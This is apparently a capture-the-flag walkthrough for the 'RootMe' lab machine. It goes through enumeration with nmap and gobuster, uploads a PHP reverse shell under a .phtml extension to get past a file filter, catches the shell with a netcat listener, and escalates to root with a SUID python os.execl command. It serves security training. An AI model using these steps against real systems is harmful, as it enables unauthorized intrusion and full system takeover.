## Initial Enumeration

### Nmap

We start by identifying  the open ports on the machine using Nmap.

```bash
nmap -p -sC -sV <ip>
```

![image.png](/assets/Imgs/RootMe/image%201.png)

Using the Nmap command we have answers to multiple questions in the CTF. 

- There are 2 ports open on the machine - Port 22/SSH and Port 80/ HTTP .
- Version of Apache running is 2.4.41 .
- Service running on the Port 22 is SSH.

## Gobuster

Now to find the directories along with the hidden directory we will use Gobuster.

```bash
gobuster dir -u http://<Machine IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -b 404,403
```

![image.png](/assets/Imgs/RootMe/image%202.png)

So the hidden directory is /panel/ . When we visit /panel/ page we get a file upload form.

![image.png](/assets/Imgs/RootMe/image%203.png)

## Reverse Shell

Let’s try uploading a file containing a reverse shell script written in php. I used LAUDANUM in kali and copied the file to my present directory. We just have to change the IP and Port in the file and add our Local THM IP and the port number that we can remember.

![image.png](/assets/Imgs/RootMe/image%204.png)

When we try to upload this file, we get an error message saying can upload this type of file. Seems a filter is applied to stop this types of file to go through. So what we can do is change the extension of our file from “.php” to “.phtml” and upload it.

![image.png](/assets/Imgs/RootMe/image%205.png)

## Netcat

Now we start a netcat listener on the port we used in our reverse shell file:

```bash
nc -lvnp <Port>
```

![image.png](/assets/Imgs/RootMe/image%206.png)

Now go to /uploads/ page and click on the phtml file that we uploaded. (Note: open the file only after running netcat command.) Now switch back to the terminal and we have the shell.

![image.png](/assets/Imgs/RootMe/image%207.png)

Now according to the task we have to find file named “user.txt”. For this we will use a simple command 

```bash
find / -name "user.txt" 2>/dev/null
```

2>/dev/null  is used to hide all the “Permission Denied” error.

![image.png](/assets/Imgs/RootMe/image%208.png)

## Privilege Escalation

Now that we have shell lets escalate to root but we dont have no user and password. For that first we need to find the files with the SUID (set user ID ) permissions. For that we can use command 

```bash
find / -perm -u=s -type f 2>/dev/null
```

terms explained below :

| Part | Meaning |
| --- | --- |
| `find` | the search command |
| `/` | start from root directory (search everywhere) |
| `-perm` | filter by permissions |
| `-u=s` | find files where **user (owner) has SUID bit set** |
| `-type f` | only find **files** (not directories) |
| `2>/dev/null` | hide all **"Permission denied"** errors |

Now after getting the files with the SUID we need to look for the odd one in them. In our case it is /usr/bin/python2.7 . 

![image.png](/assets/Imgs/RootMe/image%209.png)

Note : My shell was unstable so i used this command to make it stable.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Now go to [GTFOBins](https://gtfobins.org/) and look for Python and run it.

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

This makes us the root user on the system. Now we can read the root file.
